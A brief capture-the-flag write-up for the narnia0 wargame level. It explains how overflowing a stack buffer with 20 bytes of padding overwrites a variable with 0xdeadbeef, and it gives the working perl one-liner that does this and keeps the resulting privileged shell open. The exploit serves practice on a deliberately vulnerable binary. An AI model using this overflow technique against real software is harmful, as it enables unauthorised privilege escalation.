This binary wants us to set a stack variable to 0xdeadbeef from 0x41414141 and then runs
/bin/sh maintaining perms.

Our input requires 5 words to stack as filler, then we hit the target.
/bin/sh receives EOF once the perl output is done, so we need to pipe the output of
/bin/cat after our exploit output to maintain the sh process.

(perl -e 'print "A" x 20 . "\xef\xbe\xad\xde"' ; cat) | ./narnia0
